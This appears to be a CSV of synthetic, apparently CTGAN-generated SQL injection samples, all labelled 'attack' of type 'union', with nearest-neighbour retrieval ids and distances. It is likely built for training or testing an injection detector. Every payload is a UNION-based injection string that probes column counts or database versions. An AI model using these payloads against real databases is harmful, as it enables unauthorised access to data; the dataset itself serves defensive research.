id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000038,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000439,5.371460504809742
CTGAN_000039,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000460,5.767924424558428
CTGAN_000040,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001224,5.299904603514771
CTGAN_000041,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,5.559775701288839
CTGAN_000042,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000957,4.275625997859093
CTGAN_000043,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000778,7.7860766673617965
CTGAN_000044,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000453,4.715711358613641
CTGAN_000045,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,4.422412121864717
CTGAN_000046,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R001437,3.8378447979549293
CTGAN_000047,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000774,5.106029500386935
CTGAN_000048,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000246,7.896296734662857
CTGAN_000049,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.352364418030441
CTGAN_000050,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.699733207708138
CTGAN_000051,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R001181,4.657305697471294
CTGAN_000052,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R001602,6.504109618874047
CTGAN_000053,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,4.129942786644189
CTGAN_000054,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001214,3.5088054080374005
CTGAN_000055,attack,union,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",nearest_attack_euclidean,R000577,7.0596160372707795
CTGAN_000056,attack,union,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",nearest_attack_euclidean,R000556,5.603362549168293
CTGAN_000057,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R001578,5.689354467075031
CTGAN_000058,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,5.4004039756774675
CTGAN_000059,attack,union,"1""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001472,5.432555312926785
CTGAN_000060,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.551151724930745
CTGAN_000061,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,4.684862556338599
CTGAN_000062,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R001440,6.832602844964644
CTGAN_000063,attack,union,"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",nearest_attack_euclidean,R000760,6.717495037618138
CTGAN_000064,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000507,2.85606825927076
CTGAN_000065,attack,union,"1  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000533,4.220743194157146
CTGAN_000066,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R001314,4.676395171871847
CTGAN_000067,attack,union,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",nearest_attack_euclidean,R000377,6.396372063888078
CTGAN_000068,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,7.205435349607654
CTGAN_000069,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000692,7.3274194973611175
CTGAN_000070,attack,union,"1 where 2363  =  2363 union all select null,null,null,null,null--",nearest_attack_euclidean,R001368,6.712466765065181
CTGAN_000071,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.410952452160144
CTGAN_000072,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000994,5.8038083071935755
CTGAN_000073,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000217,4.053521807458064
CTGAN_000074,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001430,3.8830676079551165
CTGAN_000075,attack,union,"-2325'   )    )     )   union all select 1442,1442,1442--",nearest_attack_euclidean,R001428,4.292836926203217
CTGAN_000076,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001099,7.21107702413619
CTGAN_000077,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000945,4.8268653436217
CTGAN_000078,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,7.403063698877116
CTGAN_000079,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R001250,5.107308926329969
CTGAN_000080,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,7.448218335548323
CTGAN_000081,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000389,6.648087957207612
CTGAN_000082,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,4.370656469983477
CTGAN_000083,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000472,3.525733750768174
CTGAN_000084,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000048,6.904634504117345
CTGAN_000085,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R001442,5.240125575948862
CTGAN_000086,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001257,5.73811797518715
CTGAN_000087,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000460,5.041481019209581
CTGAN_000088,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,4.78527773312545
CTGAN_000089,attack,union," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",nearest_attack_euclidean,R000137,9.509774169808248
CTGAN_000090,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,5.1264159416171635
CTGAN_000091,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R001570,5.750410639649725
CTGAN_000092,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,6.525793464991946
CTGAN_000093,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000493,7.49549317322693
CTGAN_000094,attack,union,"1   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000770,4.354245773009751
CTGAN_000095,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000412,4.529341600213888
CTGAN_000096,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000231,4.587993728603168
CTGAN_000097,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,7.65872572006869
CTGAN_000098,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.471280834729727
CTGAN_000099,attack,union,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",nearest_attack_euclidean,R001094,6.742853808743949
CTGAN_000100,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001340,6.247626205578082
CTGAN_000101,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,6.197104871879296
CTGAN_000102,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000882,5.7415318347168585
CTGAN_000103,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000488,6.348855224505816
CTGAN_000104,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000970,5.856279878504913
CTGAN_000105,attack,union,"1""   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R001043,7.0360867499318696
CTGAN_000106,attack,union,"-6400   )    )    union all select 4650,4650,4650--",nearest_attack_euclidean,R000206,4.445179865538749
CTGAN_000107,attack,union,"-8943%'  )   union all select 7710,7710#",nearest_attack_euclidean,R000572,7.677905863398401
CTGAN_000108,attack,union,"-4798%'   )    )     )   union all select 3330,3330,3330#",nearest_attack_euclidean,R000731,7.825370415131633
CTGAN_000109,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R001029,6.697193679317089
CTGAN_000110,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000811,5.52285648237319
CTGAN_000111,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000608,6.340334431538073
CTGAN_000112,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,6.2167257328850045
CTGAN_000113,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000766,3.3468520337479433
CTGAN_000114,attack,union,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",nearest_attack_euclidean,R000788,4.135447196118267
CTGAN_000115,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001257,5.558470149712453
CTGAN_000116,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000987,7.259903565184158
CTGAN_000117,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R001118,7.329318424477127
CTGAN_000118,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000834,5.047910542412921
CTGAN_000119,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R001440,6.752545667639552
CTGAN_000120,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R001483,5.819053578803038
CTGAN_000121,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R001072,5.0113426542389305
CTGAN_000122,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R001384,3.5663881837833435
CTGAN_000123,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000246,5.303403410618764
CTGAN_000124,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,7.025011423059062
CTGAN_000125,attack,union,"1%'  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000741,6.956936437269966
CTGAN_000126,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001262,6.140607520491818
CTGAN_000127,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,7.755252708021679
CTGAN_000128,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,5.175689170696485
CTGAN_000129,attack,union,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",nearest_attack_euclidean,R000341,4.398003933451713
CTGAN_000130,attack,union,"1   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000775,4.983855244392598
CTGAN_000131,attack,union,"1  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000533,3.371481544780691
CTGAN_000132,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R001640,4.331901502723244
CTGAN_000133,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001190,5.442177473349551
CTGAN_000134,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R001029,4.6207520377732605
CTGAN_000135,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,5.524635381924721
CTGAN_000136,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.024089006665952
CTGAN_000137,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,6.143586481189091
CTGAN_000138,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000767,4.568497737840387
CTGAN_000139,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R001139,5.412785960293902
CTGAN_000140,attack,union,"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",nearest_attack_euclidean,R001353,6.571183862560798
CTGAN_000141,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,5.61839010214533
CTGAN_000142,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000692,5.456660457973039
CTGAN_000143,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,7.1219413604507
CTGAN_000144,attack,union,"1""   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R001043,5.743381646426238
CTGAN_000145,attack,union,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",nearest_attack_euclidean,R000456,4.271204732038794
CTGAN_000146,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,5.623216187426661
CTGAN_000147,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000487,5.226192919551626
CTGAN_000148,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,3.401883802966915
CTGAN_000149,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001284,4.351146545544756
CTGAN_000150,attack,union,"-2384%'   )    )    union all select 2467,2467,2467,2467#",nearest_attack_euclidean,R000954,6.8584219516377605
CTGAN_000151,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000767,6.565362576977065
CTGAN_000152,attack,union,"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",nearest_attack_euclidean,R000467,4.482004397670691
CTGAN_000153,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001279,5.810312921880614
CTGAN_000154,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000811,5.5590220883511945
CTGAN_000155,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R001181,5.079396918769068
CTGAN_000156,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R001215,5.108846909040735
CTGAN_000157,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000179,8.975554191227715
CTGAN_000158,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,5.169053344890754
CTGAN_000159,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,5.6324649957310715
CTGAN_000160,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000414,5.773027474001351
CTGAN_000161,attack,union,"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",nearest_attack_euclidean,R000329,4.760790080731712
CTGAN_000162,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,5.310743325060005
CTGAN_000163,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001340,4.928475999092484
CTGAN_000164,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,4.83391672610488
CTGAN_000165,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001224,5.090939576214642
CTGAN_000166,attack,union,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",nearest_attack_euclidean,R001305,4.9456504031795925
CTGAN_000167,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,6.830963596266414
CTGAN_000168,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,6.747667399142932
CTGAN_000169,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,5.827967488980469
CTGAN_000170,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,6.194782807610959
CTGAN_000171,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R001384,3.3847989628319275
CTGAN_000172,attack,union,"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",nearest_attack_euclidean,R000553,5.287661142562313
CTGAN_000173,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,4.884918183743399
CTGAN_000174,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.982146475770432
CTGAN_000175,attack,union,1'   )    )    as wuws where 6917  =  6917 union all select null#,nearest_attack_euclidean,R000660,6.577415874782848
CTGAN_000176,attack,union,"1   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000770,5.815444461358806
CTGAN_000177,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001642,6.074110991089118
CTGAN_000178,attack,union,"1' where 4358  =  4358 union all select null,null,null,null--",nearest_attack_euclidean,R001290,4.2652692706404896
CTGAN_000179,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R001317,6.526653852071899
CTGAN_000180,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000769,6.477513650351794
CTGAN_000181,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000302,5.143375560800394
CTGAN_000182,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001430,4.610121803074626
CTGAN_000183,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,6.277775561493708
CTGAN_000184,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,8.296756769102048
CTGAN_000185,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000507,2.057193091053531
CTGAN_000186,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001172,5.00492386449201
CTGAN_000187,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001190,4.493784021468949
CTGAN_000188,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000322,6.399165479942155
CTGAN_000189,attack,union," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000182,8.14608175773837
CTGAN_000190,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R001394,4.208848787933335
CTGAN_000191,attack,union,"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",nearest_attack_euclidean,R001322,6.017667649060619
CTGAN_000192,attack,union,"-1055' union all select 7758,7758,7758,7758,7758,7758--",nearest_attack_euclidean,R001089,5.840815249391025
CTGAN_000193,attack,union,"1'   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000471,4.979704908157254
CTGAN_000194,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000870,6.094195383680116
CTGAN_000195,attack,union,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000633,4.115469499997301
CTGAN_000196,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001388,5.0942386778715365
CTGAN_000197,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R001442,7.581874184584372
CTGAN_000198,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001638,5.4825528411152415
CTGAN_000199,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001533,6.278603875125528
CTGAN_000200,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000317,5.886320147067262
CTGAN_000201,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000652,5.668435715926403
CTGAN_000202,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000639,4.872427916116104
CTGAN_000203,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001430,5.205007541087613
